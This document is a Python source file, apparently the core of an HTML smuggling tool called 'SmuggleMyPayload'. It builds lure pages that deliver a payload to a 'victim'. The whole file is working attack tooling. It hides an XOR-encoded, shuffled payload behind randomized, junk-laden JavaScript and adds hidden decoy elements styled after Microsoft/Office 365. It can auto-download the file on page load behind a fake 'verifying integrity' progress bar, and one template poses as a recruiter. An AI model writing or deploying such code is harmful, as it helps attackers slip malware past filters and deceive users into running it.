"""
SmuggleMyPayload Core Engine
Obfuscation, JS generation, and HTML build logic.

Obfuscation layers:
  - XOR-encoded payload with runtime decoder (no raw base64 visible)
  - Comma-boundary chunk splitting (safe for large payloads)
  - Shuffled chunk ordering with index array
  - Adaptive chunk sizing for payloads up to multi-MB
  - Randomized JS variable/function names per generation
  - Junk whitespace and comment injection in JS
  - Decoy DOM elements with plausible CSS class names
"""

import os
import re
import random
import string
import datetime
import base64

from smuggle_logos import DEFAULT_LOGOS, LOGO_HEIGHT, encode_image
from smuggle_templates import (
    TEMPLATES, METHODS, DEFAULT_OUTPUT, STYLES,
    TEMPLATE_HTML, CUSTOM_HTML,
)


# -- Core Functions --

def rand_var(n: int = 8) -> str:
    """Generate a random JS-safe variable name: _abcdefgh"""
    return '_' + ''.join(random.choices(string.ascii_lowercase, k=n))


def b64_encode(data: bytes) -> str:
    """Base64-encode raw bytes to string."""
    return base64.b64encode(data).decode('ascii')


def split_b64(b64: str, chunk_size: int = 10000) -> list:
    """Split base64 string into chunks for JS array embedding."""
    if not b64:
        return ['']
    return [b64[i:i + chunk_size] for i in range(0, len(b64), chunk_size)]


def sanitize_filename(name: str) -> str:
    """Remove chars that could break JS strings or enable XSS."""
    return re.sub(r"[^a-zA-Z0-9._\- ]", '', name)


def make_deadline(days: int = 7) -> str:
    """Generate a deadline date string N days from now."""
    dt = datetime.datetime.now() + datetime.timedelta(days=days)
    return dt.strftime('%B %d, %Y')


def make_timestamp() -> str:
    """Generate a realistic timestamp for 'sent' or 'shared' notices."""
    dt = datetime.datetime.now()
    return dt.strftime('%B %d, %Y at %I:%M %p')


# -- Obfuscation Engine --

def _xor_encode(data_b64: str, key: int) -> list:
    """XOR each char of base64 string with a single-byte key.
    Returns list of XOR'd char codes. The JS decoder reverses this."""
    return [ord(c) ^ key for c in data_b64]


def _split_csv_chunks(csv_str: str, max_size: int) -> list:
    """Split comma-separated values at comma boundaries near max_size.
    Unlike split_b64 which cuts at arbitrary char positions, this ensures
    no value is split mid-number. Chunks rejoin cleanly with no empty
    strings when split by comma."""
    if len(csv_str) <= max_size:
        return [csv_str]
    chunks = []
    start = 0
    while start < len(csv_str):
        if start + max_size >= len(csv_str):
            chunks.append(csv_str[start:])
            break
        
        end = csv_str.rfind(',', start, start + max_size)
        if end <= start:
           
            end = csv_str.find(',', start + max_size)
            if end == -1:
                chunks.append(csv_str[start:])
                break
        chunks.append(csv_str[start:end])
        start = end + 1  
    return chunks


def _adaptive_chunk_size(payload_len: int) -> int:
    """Calculate optimal chunk size based on payload length.

    Scales chunk size so that:
      - Small payloads (<50KB):  8,000 chars per chunk (~3-10 chunks)
      - Medium payloads (<500KB): 32,000 chars per chunk (~10-50 chunks)
      - Large payloads (<2MB):   64,000 chars per chunk (~20-100 chunks)
      - Very large (>2MB):      128,000 chars per chunk (bounded chunks)

    This prevents the JS chunk array from having 1000+ entries on
    large payloads, which would bloat the HTML and slow the browser.
    """
    if payload_len < 50_000:
        return 8_000
    elif payload_len < 500_000:
        return 32_000
    elif payload_len < 2_000_000:
        return 64_000
    else:
        return 128_000


def _generate_junk_ws() -> str:
    """Generate random whitespace/comment noise for JS injection."""
    patterns = [
        '  ',
        '\t',
        ' /* {} */ '.format(''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 8)))),
        ' // {}\n'.format(''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 10)))),
    ]
    return random.choice(patterns)


def _generate_decoy_dom() -> str:
    """Generate hidden decoy DOM elements that look like app scaffold."""
    classes = [
        'ms-Layer', 'o365-nav', 'sui-layout', 'ds-modal', 'az-panel',
        'li-feed', 'sp-pageLayout', 'od-ItemRow', 'fui-FluentProvider',
        'ms-Fabric', 'ds-envelope', 'az-subscription-panel',
    ]
    tags = random.sample(classes, k=random.randint(2, 4))
    divs = []
    for cls in tags:
        rid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        divs.append(
            f'<div class="{cls}" id="r{rid}" '
            f'style="position:absolute;width:0;height:0;overflow:hidden" '
            f'aria-hidden="true"></div>'
        )
    return '\n'.join(divs)


def make_smuggle_js(payload_b64: str, filename: str) -> tuple:
    """
    Generate the core HTML smuggling JavaScript with layered obfuscation.
    Returns (function_name, js_code).

    Obfuscation layers:
      1. XOR-encode payload with random single-byte key
      2. Split into chunks at comma boundaries (adaptive sizing)
      3. Shuffled chunk ordering with forward permutation
      4. Randomized variable names
      5. Junk whitespace/comment injection
      6. atob -> Uint8Array -> Blob -> createObjectURL -> anchor click download
    """
    fn = rand_var()
    v = {k: rand_var() for k in [
        'xd', 'key', 'raw', 'bytes', 'blob', 'url', 'a',
        'chunks', 'order', 'joined', 'decoded', 'i',
    ]}
    safe_fn = sanitize_filename(filename)

    
    xor_key = random.randint(1, 254)
    xor_data = _xor_encode(payload_b64, xor_key)

    
    xor_str = ','.join(str(x) for x in xor_data)
    chunk_size = _adaptive_chunk_size(len(payload_b64))
    raw_chunks = _split_csv_chunks(xor_str, chunk_size)
    num_chunks = len(raw_chunks)

    
    indices = list(range(num_chunks))
    shuffled = indices[:]
    random.shuffle(shuffled)

  
    ordered_chunks = [''] * num_chunks
    for i, si in enumerate(shuffled):
        ordered_chunks[si] = raw_chunks[i]

    chunks_js = ','.join(f'"{c}"' for c in ordered_chunks)
    order_js = ','.join(str(x) for x in shuffled)
    jw = _generate_junk_ws

    js = (
        f'{jw()}var {v["chunks"]}=[{chunks_js}];{jw()}\n'
        f'var {v["order"]}=[{order_js}];\n'
        f'var {v["key"]}={xor_key};\n'
        f'function {fn}(){{{jw()}\n'
        f'  var {v["joined"]}="";{jw()}\n'
        f'  for(var {v["i"]}=0;{v["i"]}<{v["order"]}.length;{v["i"]}++){{{jw()}\n'
        f'    if({v["i"]}>0){v["joined"]}+=",";\n'
        f'    {v["joined"]}+={v["chunks"]}[{v["order"]}[{v["i"]}]];\n'
        f'  }}{jw()}\n'
        f'  var {v["xd"]}={v["joined"]}.split(",");\n'
        f'  var {v["decoded"]}="";\n'
        f'  for(var {v["i"]}=0;{v["i"]}<{v["xd"]}.length;{v["i"]}++){{\n'
        f'    {v["decoded"]}+=String.fromCharCode(parseInt({v["xd"]}[{v["i"]}])^{v["key"]});\n'
        f'  }}{jw()}\n'
        f'  var {v["raw"]}=atob({v["decoded"]});{jw()}\n'
        f'  var {v["bytes"]}=new Uint8Array({v["raw"]}.length);\n'
        f'  for(var {v["i"]}=0;{v["i"]}<{v["raw"]}.length;{v["i"]}++){v["bytes"]}[{v["i"]}]={v["raw"]}.charCodeAt({v["i"]});\n'
        f'  var {v["blob"]}=new Blob([{v["bytes"]}],{{type:"application/octet-stream"}});{jw()}\n'
        f'  var {v["url"]}=URL.createObjectURL({v["blob"]});\n'
        f'  var {v["a"]}=document.createElement("a");\n'
        f'  {v["a"]}.href={v["url"]};\n'
        f'  {v["a"]}.download="{safe_fn}";\n'
        f'  document.body.appendChild({v["a"]});{jw()}\n'
        f'  {v["a"]}.click();\n'
        f'  setTimeout(function(){{URL.revokeObjectURL({v["url"]});}},5000);\n'
        f'}}'
    )
    return fn, js


def make_trigger_js(fn_deliver: str, method: str, redirect_url: str = None) -> tuple:
    """
    Generate the UI trigger JavaScript (progress animation + deliver call).
    Returns (trigger_function_name, js_code).

    Method '1': button click triggers progress -> deliver
    Method '2': window.onload auto-triggers progress -> deliver
    """
    fn = rand_var()

    redirect_snippet = ''
    if redirect_url:
        safe_url = redirect_url.replace("'", "\\'")
        redirect_snippet = (
            f'\n  setTimeout(function(){{\n'
            f'    if(msg)msg.textContent="Redirecting...";\n'
            f'    setTimeout(function(){{window.location.href=\'{safe_url}\';}},800);\n'
            f'  }},1500);'
        )

    js = (
        f'function {fn}(){{\n'
        f'  var btn=document.getElementById("btn"),bar=document.getElementById("bar"),\n'
        f'      fill=document.getElementById("fill"),msg=document.getElementById("msg");\n'
        f'  if(btn){{btn.disabled=true;btn.style.opacity="0.7";}}\n'
        f'  if(bar)bar.style.display="block";\n'
        f'  if(msg)msg.style.display="block";\n'
        f'  var steps=[[300,"Preparing download..."],[900,"Verifying file integrity..."],[1500,"Decrypting..."],[2100,"Starting download..."]];\n'
        f'  steps.forEach(function(s,i){{\n'
        f'    setTimeout(function(){{\n'
        f'      if(fill)fill.style.width=((i+1)/steps.length*100)+"%";\n'
        f'      if(msg)msg.textContent=s[1];\n'
        f'    }},s[0]);\n'
        f'  }});\n'
        f'  setTimeout(function(){{\n'
        f'    if(fill)fill.style.width="100%";\n'
        f'    if(msg)msg.textContent="Download complete.";\n'
        f'    if(btn)btn.textContent="\\u2713 Downloaded";\n'
        f'    {fn_deliver}();{redirect_snippet}\n'
        f'  }},2500);\n'
        f'}}'
    )

    if method == '2':
        js += (
            f'\nwindow.onload=function(){{\n'
            f'  var btn=document.getElementById("btn");\n'
            f'  if(btn){{btn.disabled=true;btn.textContent="Preparing download...";btn.style.opacity="0.7";}}\n'
            f'  setTimeout({fn},600);\n'
            f'}};'
        )

    return fn, js


# -- Build Engine --

def build_html(template: str, payload_b64: str, filename: str,
               method: str = '1', redirect_url: str = None,
               custom_opts: dict = None, logo_path: str = None) -> str:
    """
    Build the final HTML lure page with obfuscated payload.

    Args:
        template:     Template key ('1'-'7')
        payload_b64:  Base64-encoded payload string
        filename:     Download filename shown to victim
        method:       '1' click-to-download, '2' auto-download
        redirect_url: Optional URL to redirect after download
        custom_opts:  Dict of custom template fields (for template '7')
        logo_path:    Optional path to brand logo image (png/jpg/svg)

    Returns:
        Complete HTML string ready to serve.
    """
    fn_deliver, smuggle_js = make_smuggle_js(payload_b64, filename)
    fn_trigger, trigger_js = make_trigger_js(fn_deliver, method, redirect_url)
    full_js = smuggle_js + '\n' + trigger_js

    if template == '7' and custom_opts:
        style = custom_opts
    elif template in STYLES:
        style = STYLES[template]
    else:
        style = STYLES.get('1', {})

    year = str(datetime.datetime.now().year)
    safe_filename = sanitize_filename(filename)

    html = TEMPLATE_HTML.get(template, CUSTOM_HTML)

    
    replacements = {
        '__TITLE__': style.get('title', 'Download'),
        '__HEADING__': style.get('heading', 'Download Ready'),
        '__BODY__': style.get('body', 'Your file is ready.'),
        '__BTN__': style.get('btn_text', 'Download'),
        '__ACCENT__': style.get('accent', '#0078d4'),
        '__FOOTER__': style.get('footer', ''),
        '__FN__': fn_trigger,
        '__JS__': full_js,
        '__FILENAME__': safe_filename,
        '__YEAR__': year,
        '__DEADLINE__': make_deadline(),
        '__TIMESTAMP__': make_timestamp(),
        '__DECOYS__': _generate_decoy_dom(),
    }
    for placeholder, value in replacements.items():
        html = html.replace(placeholder, value)

    
    if template == '2':
        html = html.replace('__ACCENT2__', style.get('accent2', '#c5b358'))
    if template == '5':
        alert_id = ''.join(random.choices(string.digits, k=8))
        html = html.replace('__ALERTID__', alert_id)
    if template == '6':
        sender = style.get('sender_name', 'Sarah Chen')
        html = html.replace('__SENDER__', sender)
        html = html.replace('__SENDER_FIRST__', sender.split()[0])
        html = html.replace('__SENDER_TITLE__', style.get('sender_title', 'Talent Acquisition'))
        html = html.replace('__INITIALS__', style.get('sender_initials', 'SC'))
    if template == '7':
        html = html.replace('__LOGO_TEXT__', style.get('logo_text', 'Download Portal'))

    
    if logo_path and os.path.isfile(logo_path):
        h = LOGO_HEIGHT.get(template, 24)
        data_uri = encode_image(logo_path)
        logo_markup = f'<img src="{data_uri}" style="height:{h}px" alt="">'
    else:
        logo_markup = DEFAULT_LOGOS.get(template, '')
    html = html.replace('__BRAND_LOGO__', logo_markup)

    return html
